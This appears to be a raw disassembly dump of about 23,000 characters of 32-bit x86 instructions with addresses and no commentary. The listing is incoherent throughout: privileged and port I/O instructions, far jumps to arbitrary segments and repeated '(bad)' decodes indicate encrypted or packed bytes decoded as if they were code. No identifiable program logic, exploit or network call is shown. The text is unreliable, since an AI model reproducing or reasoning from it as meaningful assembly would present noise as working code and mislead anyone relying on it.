  417de6:	outs   dx,BYTE PTR ds:[esi]
  417de7:	or     eax,0xdd96406b
  417dec:	jmp    0x1cbec607
  417df1:	jae    0x417d93
  417df3:	inc    edx
  417df4:	xchg   esi,eax
  417df5:	mov    DWORD PTR ds:0xaef40ed2,ebp
  417dfb:	ds dec ebx
  417dfd:	push   0xffffffab
  417dff:	mov    edi,0xe4bbfd9
  417e04:	js     0x417dbf
  417e06:	lds    esp,FWORD PTR [edx-0x14]
  417e09:	sub    eax,0x946e514b
  417e0e:	sbb    DWORD PTR [edx],0x3f
  417e11:	xchg   ecx,eax
  417e12:	adc    cl,ah
  417e14:	outs   dx,BYTE PTR ds:[esi]
  417e15:	pop    edi
  417e16:	imul   ebp,DWORD PTR [ebp+0x8],0xf96c1e5c
  417e1d:	jbe    0x417dea
  417e1f:	sub    ebp,edx
  417e21:	aaa    
  417e22:	add    al,0x39
  417e24:	jge    0x417e1a
  417e26:	imul   esi,DWORD PTR [esi],0xffffffc3
  417e29:	out    0x93,al
  417e2b:	mov    ds:0xbf1d2d7b,eax
  417e30:	ds jo  0x417e5e
  417e33:	mov    DWORD PTR [edx+ebp*2-0x78],edi
  417e37:	push   edi
  417e38:	sub    BYTE PTR [ecx+edi*8-0x2e88120e],0xac
  417e40:	sub    eax,0x57d76786
  417e45:	xchg   ebp,eax
  417e46:	shl    eax,cl
  417e48:	jg     0x417e1e
  417e4a:	push   ebp
  417e4b:	push   0xd43113ea
  417e50:	mov    ds,WORD PTR [ecx]
  417e52:	cdq    
  417e53:	cld    
  417e54:	push   es
  417e55:	add    BYTE PTR [ebp+0x143172b],dl
  417e5b:	inc    esi
  417e5c:	jns    0x417ed9
  417e5e:	lock fs mov esp,0x1e8e9461
  417e65:	cli    
  417e66:	or     DWORD PTR [ecx+ebp*8+0x7a],0x7
  417e6b:	xchg   esp,eax
  417e6c:	adc    cl,bh
  417e6e:	push   edi
  417e6f:	jb     0x417e96
  417e71:	mov    cl,0x4
  417e73:	cld    
  417e74:	jne    0x417e9c
  417e76:	push   ebx
  417e77:	loop   0x417ea5
  417e79:	jp     0x417e34
  417e7b:	in     eax,dx
  417e7c:	pushf  
  417e7d:	repnz imul esp,DWORD PTR ss:[bp+0x39],0xf0d7e539
  417e87:	shl    ebx,1
  417e89:	inc    esp
  417e8a:	xchg   DWORD PTR [ebx+eiz*1-0x2],edi
  417e8e:	mov    esi,0xac78762a
  417e93:	inc    edx
  417e94:	lds    ebp,FWORD PTR [ebp+0x58]
  417e97:	xor    esi,DWORD PTR [esi]
  417e99:	push   cs
  417e9a:	fidivr WORD PTR [edi-0x20192c7f]
  417ea0:	mov    dh,0x93
  417ea2:	out    0xc8,al
  417ea4:	ins    DWORD PTR es:[edi],dx
  417ea5:	or     al,0x51
  417ea7:	repz ret 
  417ea9:	xchg   esi,eax
  417eaa:	rcr    BYTE PTR [edx-0x4dafb6da],0xdf
  417eb1:	fmul   DWORD PTR ds:0x35537179
  417eb7:	(bad)  
  417eb8:	sbb    dh,BYTE PTR cs:[eax+0x52]
  417ebc:	test   al,0xb4
  417ebe:	push   edi
  417ebf:	loop   0x417f08
  417ec1:	es sahf 
  417ec3:	and    eax,DWORD PTR [esi+0x2e]
  417ec6:	add    DWORD PTR [eax-0x7733d360],ebx
  417ecc:	sub    BYTE PTR [esi],cl
  417ece:	cs repz pushf 
  417ed1:	dec    ebp
  417ed2:	mov    ecx,0xfdd6839f
  417ed7:	enter  0x1787,0x87
  417edb:	fld    TBYTE PTR [ebx-0x6f]
  417ede:	mov    esp,0xd49cd87a
  417ee3:	xor    al,0xa3
  417ee5:	pusha  
  417ee6:	inc    edx
  417ee7:	xchg   ecx,eax
  417ee8:	sub    eax,0xdfeba3c4
  417eed:	adc    DWORD PTR [edx-0x44],edx
  417ef0:	mov    ebx,cs
  417ef2:	mov    al,0x6b
  417ef4:	cmp    esp,esp
  417ef6:	sbb    al,0x41
  417ef8:	imul   esi,DWORD PTR [edx+eiz*4],0xffffffbb
  417efc:	jae    0x417ec2
  417efe:	call   DWORD PTR [ebp-0x3e]
  417f01:	push   ebx
  417f02:	xchg   edx,eax
  417f03:	xor    eax,0x7f850f31
  417f08:	xchg   ah,bl
  417f0a:	sar    dl,0x14
  417f0d:	loopne 0x417f49
  417f0f:	int3   
  417f10:	lahf   
  417f11:	add    bl,cl
  417f13:	adc    edx,DWORD PTR [esi+0x180c7fa5]
  417f19:	mov    bh,0x23
  417f1b:	(bad)  
  417f1c:	or     ebx,DWORD PTR [ebx]
  417f1e:	stos   DWORD PTR es:[edi],eax
  417f1f:	mov    eax,ds:0x295775f0
  417f24:	push   eax
  417f25:	(bad)  
  417f26:	stc    
  417f27:	inc    ebp
  417f28:	test   ebp,ebp
  417f2a:	in     eax,0x50
  417f2c:	mov    BYTE PTR [edi+eiz*1+0xc04b9c3],0xe6
  417f34:	jmp    0x3977:0x610bec1
  417f3b:	test   BYTE PTR [ebx-0x63],al
  417f3e:	test   ecx,esi
  417f40:	pop    ds
  417f41:	ret    0x4d90
  417f44:	pop    edi
  417f45:	iret   
  417f46:	xor    dh,BYTE PTR [ecx]
  417f48:	test   DWORD PTR [ebx+0x5f477349],0xd812cc22
  417f52:	test   BYTE PTR [ebx+edi*8+0x3bae460b],ah
  417f59:	xor    al,0x47
  417f5b:	inc    edi
  417f5c:	push   esp
  417f5d:	das    
  417f5e:	shr    DWORD PTR [esi+0x5c125e61],1
  417f64:	pop    edi
  417f65:	lds    edx,FWORD PTR [edx+edi*4]
  417f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f69:	mov    ch,0x8e
  417f6b:	cvttps2pi mm6,QWORD PTR [esi-0x12]
  417f6f:	aaa    
  417f70:	add    al,0x9c
  417f72:	shl    edi,1
  417f74:	vmread DWORD PTR [edx-0x5514db38],esi
  417f7b:	dec    ecx
  417f7c:	inc    eax
  417f7d:	jg     0x417f13
  417f7f:	fistp  WORD PTR [ebx-0x2bd4d3a2]
  417f85:	mov    bl,0x7c
  417f87:	gs mov ebx,0x8f39fc5c
  417f8d:	sub    ah,BYTE PTR [edi+0x5c]
  417f90:	inc    ebx
  417f91:	pop    edx
  417f92:	cmc    
  417f93:	fisub  DWORD PTR [esi-0x7d]
  417f96:	add    DWORD PTR [ebx-0xb],edx
  417f99:	or     al,0xc7
  417f9b:	pop    esi
  417f9c:	test   al,0x8
  417f9e:	or     bh,BYTE PTR [esp+ecx*4-0x23ed1dc8]
  417fa5:	je     0x417fa0
  417fa7:	je     0x418026
  417fa9:	sbb    al,0x8a
  417fab:	addr16 xchg esp,eax
  417fad:	dec    ebx
  417fae:	inc    ecx
  417faf:	pop    eax
  417fb0:	push   0x46
  417fb2:	push   esp
  417fb3:	stos   BYTE PTR es:[edi],al
  417fb4:	push   ebp
  417fb5:	mov    ecx,0x94a73702
  417fba:	jp     0x417fc2
  417fbc:	repnz xor al,0xd5
  417fbf:	lods   eax,DWORD PTR ds:[esi]
  417fc0:	pop    eax
  417fc1:	cs push ds
  417fc3:	jae    0x417fc8
  417fc5:	sti    
  417fc6:	and    DWORD PTR [ecx-0x53695fdc],0xffffff91
  417fcd:	test   BYTE PTR [eax+0x13b1bd4],cl
  417fd3:	test   DWORD PTR [edi-0x8],ebp
  417fd6:	inc    eax
  417fd7:	cmc    
  417fd8:	push   0xffffffdc
  417fda:	pop    edi
  417fdb:	add    BYTE PTR [ebx-0x1e],0x5a
  417fdf:	push   edx
  417fe0:	aas    
  417fe1:	add    DWORD PTR [ecx],0x9ae22686
  417fe7:	ret    0xad12
  417fea:	das    
  417feb:	cmp    DWORD PTR [ecx-0x17],0xfffffffe
  417fef:	les    esi,FWORD PTR [ecx+ebp*8]
  417ff2:	or     eax,DWORD PTR [eax-0x1825b349]
  417ff8:	push   eax
  417ff9:	pop    ecx
  417ffa:	push   eax
  417ffb:	cmp    dl,al
  417ffd:	pop    eax
  417ffe:	in     eax,dx
  417fff:	stos   DWORD PTR es:[edi],eax
  418000:	out    dx,al
  418001:	mov    ds:0x37a82833,eax
  418006:	push   ds
  418007:	loope  0x417fc6
  418009:	out    dx,eax
  41800a:	pop    esi
  41800b:	sub    cl,dl
  41800d:	test   eax,0x5664cd19
  418012:	inc    esi
  418013:	shl    BYTE PTR [esi],cl
  418015:	sub    eax,0x71d95207
  41801a:	push   ebx
  41801b:	push   es
  41801c:	xchg   esi,eax
  41801d:	stos   DWORD PTR es:[edi],eax
  41801e:	jmp    0x342b12cf
  418023:	loop   0x417fd4
  418025:	cmp    al,BYTE PTR [eax+0x77]
  418028:	push   ebp
  418029:	ret    0x1fe9
  41802c:	adc    ah,ah
  41802e:	fidiv  DWORD PTR [edx+edi*1-0x71]
  418032:	inc    edx
  418033:	xor    ah,bl
  418035:	jns    0x417fdc
  418037:	adc    BYTE PTR [edi+0x32df8425],bl
  41803d:	mov    ch,bh
  41803f:	add    eax,0xed82a87
  418044:	stos   BYTE PTR es:[edi],al
  418045:	mov    eax,0x8399334b
  41804a:	into   
  41804b:	fimul  WORD PTR [esi]
  41804d:	mov    eax,0x37394377
  418052:	mov    ch,0x55
  418054:	leave  
  418055:	(bad)  
  418056:	stos   DWORD PTR es:[edi],eax
  418057:	push   es
  418058:	push   ecx
  418059:	pusha  
  41805a:	adc    BYTE PTR [ecx],0x54
  41805d:	or     al,0x1d
  41805f:	xchg   esi,eax
  418060:	ret    0x6c41
  418063:	jae    0x418064
  418065:	push   esp
  418066:	adc    BYTE PTR [edi],bl
  418068:	data16 cli 
  41806a:	popa   
  41806b:	gs (bad) 
  41806d:	shl    BYTE PTR [edi-0x78d2f6b],1
  418073:	shl    ch,cl
  418075:	or     bl,0xee
  418078:	sbb    ecx,esp
  41807a:	jmp    0x418040
  41807c:	mov    esp,0x435641e4
  418081:	jge    0x4180e9
  418083:	dec    ebp
  418084:	jecxz  0x4180bf
  418086:	cmovns eax,DWORD PTR [edx-0x19]
  41808a:	test   bl,0xd3
  41808d:	jnp    0x4180a1
  41808f:	(bad)  
  418090:	out    dx,al
  418091:	loope  0x418036
  418093:	out    dx,eax
  418094:	out    dx,eax
  418095:	shl    BYTE PTR [eax+0x4a],cl
  418098:	cmp    eax,0xb08181c9
  41809d:	(bad)  
  41809e:	popa   
  41809f:	call   0xe447:0xfa57a512
  4180a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a7:	scas   al,BYTE PTR es:[edi]
  4180a8:	test   al,0xd4
  4180aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ab:	pusha  
  4180ac:	cmp    BYTE PTR [ecx-0x70d24058],al
  4180b2:	jmp    FWORD PTR [eax+0x0]
  4180b5:	je     0x41812d
  4180b7:	xor    eax,0x3e285990
  4180bc:	in     al,dx
  4180bd:	int3   
  4180be:	cmp    dh,BYTE PTR [esi-0x5b582ddb]
  4180c4:	adc    bl,bh
  4180c6:	into   
  4180c7:	enter  0xf5e2,0xf6
  4180cb:	fwait
  4180cc:	adc    eax,0x6a93504b
  4180d1:	and    ah,BYTE PTR [edi]
  4180d3:	mov    bh,BYTE PTR [ebp+0x5892c78f]
  4180d9:	mov    edi,0x513fbe18
  4180de:	int    0xeb
  4180e0:	cli    
  4180e1:	push   0x3f
  4180e3:	add    BYTE PTR ds:0xb6ee0dd7,bl
  4180e9:	xchg   ebx,eax
  4180ea:	in     al,0x8c
  4180ec:	sub    edx,ebp
  4180ee:	aad    0xfa
  4180f0:	dec    esi
  4180f1:	nop
  4180f2:	xchg   esp,eax
  4180f3:	stos   BYTE PTR es:[edi],al
  4180f4:	adc    eax,0x627d0669
  4180f9:	(bad)  
  4180fa:	mov    dl,0xd4
  4180fc:	adc    ah,BYTE PTR [ebp+0x67]
  4180ff:	lea    ebx,[esi]
  418101:	xchg   edi,eax
  418102:	mov    al,0xfc
  418104:	dec    eax
  418105:	aad    0xa2
  418107:	and    esp,DWORD PTR [ebp+0x27]
  41810a:	stos   DWORD PTR es:[edi],eax
  41810b:	pop    ebp
  41810c:	mov    ds:0xfe3e1972,al
  418111:	std    
  418112:	adc    dl,BYTE PTR [edx+0x6b]
  418115:	sahf   
  418116:	lahf   
  418117:	xchg   ecx,eax
  418118:	xchg   edi,eax
  418119:	jle    0x418176
  41811b:	add    eax,ecx
  41811d:	push   edx
  41811e:	and    eax,0x55bb684f
  418123:	sub    bl,BYTE PTR [ebx]
  418125:	and    BYTE PTR [ecx],0x5c
  418128:	in     eax,0xc6
  41812a:	pop    edx
  41812b:	pop    ss
  41812c:	imul   ebp,edx,0xffffffdc
  41812f:	jmp    FWORD PTR [eax-0x27]
  418132:	mov    esp,0x242d466f
  418137:	test   DWORD PTR [esi+0x462a5075],edi
  41813d:	adc    cl,BYTE PTR [ebp+ebp*2+0x45aaf783]
  418144:	mov    cs,WORD PTR [edi-0x5f]
  418147:	pop    eax
  418148:	push   ebx
  418149:	jmp    0x418184
  41814b:	pop    ebx
  41814c:	mov    DWORD PTR [edx-0x7d],eax
  41814f:	pop    eax
  418150:	imul   esp,esp,0x29
  418153:	jo     0x4180df
  418155:	push   ebx
  418156:	push   ss
  418157:	loopne 0x418169
  418159:	iret   
  41815a:	pop    ss
  41815b:	push   ss
  41815c:	add    al,0x31
  41815e:	mov    ds:0xccd5a8b4,eax
  418163:	ret    0xfd71
  418166:	pop    ecx
  418167:	add    al,0xbf
  418169:	fisub  DWORD PTR fs:[ebp+0x5b]
  41816d:	imul   esp,DWORD PTR [edx-0x5664f621],0xffffffc2
  418174:	jno    0x4181e6
  418176:	not    BYTE PTR [ebx]
  418178:	inc    edx
  418179:	popf   
  41817a:	jns    0x4181c6
  41817c:	jp     0x418146
  41817e:	push   es
  41817f:	mov    esi,0x3deffa7e
  418184:	stos   BYTE PTR es:[edi],al
  418185:	or     DWORD PTR [ebp+0x17],esi
  418188:	inc    ebp
  418189:	cmp    DWORD PTR [edx+0x15],ecx
  41818c:	inc    ecx
  41818d:	adc    al,0x34
  41818f:	mov    ebp,0x89a458df
  418194:	or     ch,BYTE PTR [edx-0x24]
  418197:	push   0xc5d4768b
  41819c:	in     al,0x2b
  41819e:	cld    
  41819f:	rol    BYTE PTR [ecx],0x82
  4181a2:	push   es
  4181a3:	ins    BYTE PTR es:[edi],dx
  4181a4:	ror    BYTE PTR cs:[ebp+0x45],cl
  4181a8:	je     0x4181f1
  4181aa:	and    edx,ebp
  4181ac:	mov    bh,ch
  4181ae:	lds    edx,FWORD PTR [ebx+0x44cb1011]
  4181b4:	xor    esp,DWORD PTR [eax+edi*2+0x5307b9b7]
  4181bb:	ds repnz int3 
  4181be:	xor    al,0x77
  4181c0:	mov    bh,BYTE PTR [ebp-0x1]
  4181c3:	bound  edi,QWORD PTR [ebx+eiz*4-0xb]
  4181c7:	in     eax,dx
  4181c8:	popa   
  4181c9:	bound  esi,QWORD PTR [ecx-0x1389f187]
  4181cf:	(bad)  
  4181d0:	daa    
  4181d1:	fidiv  DWORD PTR [edx]
  4181d3:	sub    eax,0x5da8dca6
  4181d8:	mov    ecx,0x80c3c2cd
  4181dd:	in     eax,0x72
  4181df:	ins    BYTE PTR es:[edi],dx
  4181e0:	cmp    BYTE PTR [ebp-0x6560327],dl
  4181e6:	mov    eax,ds:0x5a30f3ac
  4181eb:	out    dx,al
  4181ec:	mov    edx,0xb4227c2e
  4181f1:	mov    ds:0x6878e7d9,al
  4181f6:	xor    al,0xb2
  4181f8:	cs mov dl,0x16
  4181fb:	cdq    
  4181fc:	push   cs
  4181fd:	pop    ds
  4181fe:	aas    
  4181ff:	adc    eax,0xa7ab6848
  418204:	scas   eax,DWORD PTR es:[edi]
  418205:	xor    DWORD PTR [esi+eiz*8-0xf],ebp
  418209:	scas   al,BYTE PTR es:[edi]
  41820a:	retf   
  41820b:	ds dec ebp
  41820d:	cmp    al,0xd4
  41820f:	iret   
  418210:	mov    ds:0xdbb81f8f,eax
  418215:	mov    es,WORD PTR [ebp+eiz*1-0x4b2f1e7e]
  41821c:	pop    edi
  41821d:	push   cs
  41821e:	inc    edi
  41821f:	push   ebp
  418220:	iret   
  418221:	gs dec esi
  418223:	sbb    DWORD PTR [ebp+0x4c],esp
  418226:	dec    edx
  418227:	out    0xb7,al
  418229:	jnp    0x4181bf
  41822b:	sbb    eax,0xdd802259
  418230:	pop    ecx
  418231:	or     eax,0xf66c6614
  418236:	call   0x7b0e:0xd1296eb5
  41823d:	(bad)  
  41823e:	cmp    BYTE PTR [ebp+0xf441f78],al
  418244:	or     DWORD PTR [esi],esp
  418246:	add    ch,BYTE PTR [ebx+eiz*2-0x2f]
  41824a:	push   0xffffff96
  41824c:	leave  
  41824d:	jg     0x4182aa
  41824f:	test   al,0xa
  418251:	push   edx
  418252:	mov    al,ds:0x7b0a3ecf
  418257:	inc    esp
  418258:	pop    esi
  418259:	pop    edi
  41825a:	cmp    ch,BYTE PTR [ebp+0x25]
  41825d:	xchg   ebp,eax
  41825e:	nop
  41825f:	push   eax
  418260:	(bad)  
  418261:	neg    DWORD PTR [esi+edi*2]
  418264:	jnp    0x41822d
  418266:	mov    eax,ds:0xba070f71
  41826b:	and    ebx,esi
  41826d:	das    
  41826e:	(bad)  
  41826f:	stc    
  418270:	rcl    ch,1
  418272:	mov    BYTE PTR [eax-0x32],cl
  418275:	ins    DWORD PTR es:[edi],dx
  418276:	shr    DWORD PTR [edi-0x710b3d22],0x77
  41827d:	push   ss
  41827e:	adc    DWORD PTR [edi-0x4c5af7cd],0x916b5d5f
  418288:	fild   WORD PTR [ecx]
  41828a:	pop    edi
  41828b:	xchg   esp,eax
  41828c:	test   al,0xb3
  41828e:	sti    
  41828f:	mov    bh,0x30
  418291:	fisub  DWORD PTR [ecx-0x66]
  418294:	call   0x4419e854
  418299:	retf   0x419c
  41829c:	(bad)  
  41829e:	arpl   WORD PTR [eax],si
  4182a0:	mov    BYTE PTR [esi+esi*4-0x20],bl
  4182a4:	inc    ebx
  4182a5:	(bad)  
  4182a7:	(bad)  
  4182a8:	xor    al,0x5e
  4182aa:	je     0x41829b
  4182ac:	mov    esi,0xf8328936
  4182b1:	ins    DWORD PTR es:[edi],dx
  4182b2:	ins    DWORD PTR es:[edi],dx
  4182b3:	sub    eax,0x2ce94ad6
  4182b8:	dec    edi
  4182b9:	push   edx
  4182ba:	jno    0x4182fe
  4182bc:	cmp    ch,ch
  4182be:	mov    ds:0xb5f0c41a,eax
  4182c3:	adc    ecx,edx
  4182c5:	pop    esi
  4182c6:	sub    dl,BYTE PTR [eax+eiz*2-0x4a62734b]
  4182cd:	fnstenv [ecx-0x2e]
  4182d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182d1:	or     eax,0x6681d013
  4182d6:	mov    esp,0xc85c552b
  4182db:	sub    BYTE PTR [ebx],ah
  4182dd:	dec    edi
  4182de:	mov    ch,0x25
  4182e0:	mov    ds:0xe3bf47e6,eax
  4182e5:	mov    esp,0x3b0364c2
  4182ea:	add    ah,ch
  4182ec:	scas   eax,DWORD PTR es:[edi]
  4182ed:	ffree  st(2)
  4182ef:	arpl   WORD PTR [esi-0x3c],cx
  4182f2:	data16 clc 
  4182f4:	scas   al,BYTE PTR es:[edi]
  4182f5:	ja     0x4182fc
  4182f7:	dec    ecx
  4182f8:	imul   esp,DWORD PTR [edi],0xffffffbd
  4182fb:	cmp    eax,0x56d4d87e
  418300:	dec    eax
  418301:	pop    eax
  418302:	sbb    dh,BYTE PTR [ebx-0x78]
  418305:	fs lahf 
  418307:	dec    ebp
  418308:	sbb    al,0x35
  41830a:	(bad)  
  41830b:	mov    ah,0xfc
  41830d:	push   esi
  41830e:	js     0x418370
  418310:	sahf   
  418311:	pop    ds
  418312:	or     al,0x9
  418314:	xlat   BYTE PTR ds:[ebx]
  418315:	enter  0xdc1d,0x50
  418319:	pop    ecx
  41831a:	pop    ecx
  41831b:	inc    ebp
  41831c:	push   0x33
  41831e:	retf   
  41831f:	lods   al,BYTE PTR ds:[esi]
  418320:	aam    0xbe
  418322:	test   DWORD PTR [esi-0x1eafe824],eax
  418328:	mov    bh,0x91
  41832a:	adc    al,0xfd
  41832c:	push   eax
  41832d:	xor    esi,eax
  41832f:	sbb    al,0x38
  418331:	jmp    0x11ac:0xc794bbb2
  418338:	ret    
  418339:	jp     0x418328
  41833b:	mov    dl,0x56
  41833d:	lods   eax,DWORD PTR ds:[esi]
  41833e:	jns    0x418385
  418340:	pop    ds
  418341:	les    esi,FWORD PTR [edx]
  418343:	or     al,0x32
  418345:	push   ds
  418346:	pop    ecx
  418347:	pop    ds
  418348:	mov    edx,0x36883e1b
  41834d:	lods   al,BYTE PTR ds:[esi]
  41834e:	add    BYTE PTR [edx+0x54],cl
  418351:	lahf   
  418352:	arpl   WORD PTR [eax+0x7760b190],ax
  418358:	les    edx,FWORD PTR [ecx+0x1f0777e7]
  41835e:	aam    0xfb
  418360:	mov    ecx,0x48ffc839
  418365:	pop    es
  418366:	xor    eax,0x780a682e
  41836b:	and    ebp,esp
  41836d:	rcr    BYTE PTR [ecx+0x443d571a],0x8b
  418374:	mov    bh,0x1e
  418376:	ins    BYTE PTR es:[edi],dx
  418377:	push   esi
  418378:	jae    0x418357
  41837a:	xchg   esi,eax
  41837b:	aad    0x78
  41837d:	mov    esp,0x4f251354
  418382:	cdq    
  418383:	sub    BYTE PTR [ecx],al
  418385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418386:	lds    edx,FWORD PTR [ecx+0x7bd146a]
  41838c:	jg     0x41835f
  41838e:	push   esp
  41838f:	inc    eax
  418390:	sahf   
  418391:	or     BYTE PTR [ebx],ch
  418393:	nop
  418394:	je     0x4183a2
  418396:	pop    ebp
  418397:	out    0x92,al
  418399:	mov    esp,DWORD PTR [ecx-0x12d292e2]
  41839f:	int    0x8a
  4183a1:	in     al,dx
  4183a2:	jns    0x418341
  4183a4:	cmp    bh,BYTE PTR [esi-0x25d742dd]
  4183aa:	jge    0x41836e
  4183ac:	jne    0x418339
  4183ae:	jbe    0x418330
  4183b0:	mov    ds:0x9f0f6a0d,eax
  4183b5:	clc    
  4183b6:	out    dx,al
  4183b7:	dec    esp
  4183b8:	loope  0x418342
  4183ba:	sbb    BYTE PTR [edx+0x63294f9a],al
  4183c0:	mov    dh,0x17
  4183c2:	das    
  4183c3:	xchg   edx,eax
  4183c4:	addr16 jmp 0x971d:0x9d60026e
  4183cc:	jb     0x4183af
  4183ce:	sbb    bh,BYTE PTR [edx+0x5030f411]
  4183d4:	leave  
  4183d5:	jl     0x4183d9
  4183d7:	sti    
  4183d8:	pop    esp
  4183d9:	cwde   
  4183da:	push   edi
  4183db:	xchg   BYTE PTR [ebp+0x78],bh
  4183de:	(bad)  
  4183df:	retf   
  4183e0:	mov    cl,bh
  4183e2:	inc    ebp
  4183e3:	dec    edi
  4183e4:	jns    0x4183bd
  4183e6:	pop    edx
  4183e7:	fld    QWORD PTR [edx]
  4183e9:	push   ebx
  4183ea:	push   esi
  4183eb:	scas   al,BYTE PTR es:[edi]
  4183ec:	cmp    BYTE PTR [ebp+0x55],0x68
  4183f0:	inc    esi
  4183f1:	fimul  DWORD PTR [edx+0x7c]
  4183f4:	das    
  4183f5:	fnsave [edi-0x3afea39b]
  4183fb:	in     al,0xd1
  4183fd:	mov    WORD PTR [esi],?
  4183ff:	test   eax,0xde7d8c8f
  418404:	(bad)  
  418405:	mov    al,ds:0x32e23264
  41840a:	ret    
  41840b:	mov    al,0x9c
  41840d:	fiadd  DWORD PTR [ebp+ecx*8+0x4aa8357]
  418414:	std    
  418415:	es mov bh,0x29
  418418:	adc    al,0x67
  41841a:	push   0x3c
  41841c:	and    bh,BYTE PTR [esi-0x5ced2ec4]
  418422:	cwde   
  418423:	out    dx,eax
  418424:	shr    DWORD PTR [esi],1
  418426:	mov    bl,0x9a
  418428:	or     esp,DWORD PTR [ecx+0x44]
  41842b:	and    ebp,DWORD PTR [esi+0x4aada07d]
  418431:	in     eax,dx
  418432:	pusha  
  418433:	test   DWORD PTR [edi],edx
  418435:	jmp    0x41843c
  418437:	mov    ch,0xcb
  418439:	ins    BYTE PTR es:[edi],dx
  41843a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41843b:	les    eax,FWORD PTR [ebx-0x7d]
  41843e:	and    ebx,ebp
  418440:	xchg   edi,eax
  418441:	test   eax,0x2cf8f6eb
  418446:	(bad)
  418449:	outs   dx,DWORD PTR ds:[esi]
  41844a:	sbb    eax,0xdd10c98a
  41844f:	idiv   DWORD PTR [ebx-0x11]
  418452:	dec    esp
  418453:	lahf   
  418454:	xor    DWORD PTR [esi],ebx
  418456:	mov    ds:0x9cee215e,eax
  41845b:	std    
  41845c:	mov    ah,0x24
  41845e:	sbb    eax,0xda702566
  418463:	xchg   ecx,eax
  418464:	mov    ebp,DWORD PTR [ebx]
  418466:	add    al,0xea
  418468:	jo     0x418401
  41846a:	and    DWORD PTR [eax+ecx*4-0x1b],edx
  41846e:	mov    dl,0x40
  418470:	lock das 
  418472:	dec    ebx
  418473:	xchg   edi,eax
  418474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418475:	adc    al,0x27
  418477:	dec    esi
  418478:	sbb    edx,ecx
  41847a:	inc    ebx
  41847b:	test   al,0x97
  41847d:	scas   al,BYTE PTR es:[edi]
  41847e:	pop    ds
  41847f:	sbb    cl,BYTE PTR [esi+ebx*2-0x60]
  418483:	cmp    DWORD PTR [ecx-0x14],eax
  418486:	addr16 mov al,0x4b
  418489:	cmp    eax,0x1fb80567
  41848e:	in     eax,dx
  41848f:	retf   
  418490:	jnp    0x4184d3
  418492:	jmp    0xb5f9:0xb028ce6f
  418499:	cdq    
  41849a:	jmp    0x70c2bc3f
  41849f:	add    eax,0x868258fa
  4184a4:	jl     0x418515
  4184a6:	adc    eax,ebx
  4184a8:	mov    ds:0xbc2c32bd,al
  4184ad:	jo     0x41843d
  4184af:	call   DWORD PTR ds:0x28a33e64
  4184b5:	mov    es,WORD PTR [eax+ecx*4]
  4184b8:	aam    0xa5
  4184ba:	push   edi
  4184bb:	mov    bh,0x31
  4184bd:	ret    
  4184be:	jecxz  0x418478
  4184c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c1:	dec    ebp
  4184c2:	dec    eax
  4184c3:	sbb    al,0x21
  4184c5:	jnp    0x41845e
  4184c7:	mov    BYTE PTR [eax+0x43],dh
  4184ca:	stos   DWORD PTR es:[edi],eax
  4184cb:	jecxz  0x41848a
  4184cd:	popf   
  4184ce:	mov    esp,0x54538e9
  4184d3:	mov    edi,0xe80d30b0
  4184d8:	xchg   ebx,eax
  4184d9:	jg     0x418465
  4184db:	ins    BYTE PTR es:[edi],dx
  4184dc:	jecxz  0x4184c3
  4184de:	cmp    BYTE PTR [edi+0x789d4947],0x4a
  4184e5:	pop    eax
  4184e6:	pop    edi
  4184e7:	sub    al,0x6a
  4184e9:	mov    cl,0x9b
  4184eb:	adc    bl,dl
  4184ed:	xor    dl,BYTE PTR [esi]
  4184ef:	sti    
  4184f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184f1:	pop    es
  4184f2:	push   edi
  4184f3:	or     esp,edx
  4184f5:	mov    ah,0x6c
  4184f7:	stc    
  4184f8:	mov    ebx,0x868c4c1b
  4184fd:	inc    ebp
  4184fe:	rcr    DWORD PTR [edi-0x6e],cl
  418501:	adc    ebx,DWORD PTR [ecx]
  418503:	fnstsw WORD PTR [ecx]
  418505:	mov    bh,0xcf
  418507:	inc    ecx
  418508:	add    eax,0xa5a9de91
  41850d:	add    eax,0xb13d62ac
  418512:	xor    esi,DWORD PTR [ecx]
  418514:	pushf  
  418515:	repnz cmc 
  418517:	xor    eax,0xa2758e49
  41851c:	and    cl,ch
  41851e:	(bad)  
  418520:	cmp    al,0x3f
  418522:	xchg   dl,al
  418524:	adc    BYTE PTR [esi],al
  418526:	xlat   BYTE PTR ds:[ebx]
  418527:	shl    DWORD PTR [ecx+0x11e5cc82],1
  41852d:	bound  ebp,QWORD PTR [esi*1+0x45d50c0f]
  418534:	push   edx
  418535:	ins    DWORD PTR es:[edi],dx
  418536:	sub    al,0x80
  418538:	clc    
  418539:	repz cmp al,0x66
  41853c:	dec    esi
  41853d:	add    edi,DWORD PTR [ebp-0x53]
  418540:	lea    edi,[eax+ecx*1]
  418543:	mov    ds:0x499145b5,al
  418548:	gs js  0x4184dc
  41854b:	loop   0x418553
  41854d:	test   DWORD PTR [ebx+ebx*8+0x52],esp
  418551:	stos   DWORD PTR es:[edi],eax
  418552:	cmp    ah,BYTE PTR [edi+esi*1]
  418555:	lock pop ecx
  418557:	xchg   esi,eax
  418558:	inc    esi
  418559:	sbb    eax,0x59a91d62
  41855e:	fwait
  41855f:	daa    
  418560:	push   es
  418561:	(bad)  
  418562:	div    dh
  418564:	sbb    bh,ch
  418566:	fild   QWORD PTR [ebp-0x4b]
  418569:	addr16 (bad) 
  41856b:	jge    0x418505
  41856d:	ins    BYTE PTR es:[edi],dx
  41856e:	mov    bl,0xe0
  418570:	inc    esi
  418571:	int    0xe8
  418573:	out    0x85,al
  418575:	rol    BYTE PTR [ebx-0xb8909bc],cl
  41857b:	aad    0xff
  41857d:	xor    ecx,DWORD PTR [edi-0x49ec1c03]
  418583:	push   es
  418584:	mov    ds:0x4a1c0548,eax
  418589:	or     DWORD PTR [ebp-0x13],edx
  41858c:	cmc    
  41858d:	push   esi
  41858e:	jge    0x41853c
  418590:	dec    esp
  418591:	fidiv  WORD PTR [ebx]
  418593:	jo     0x418564
  418595:	and    edx,DWORD PTR [ecx+eiz*8-0x63]
  418599:	js     0x4185e7
  41859b:	sysexit 
  41859d:	and    al,0x41
  41859f:	mov    ebx,0xcc85698
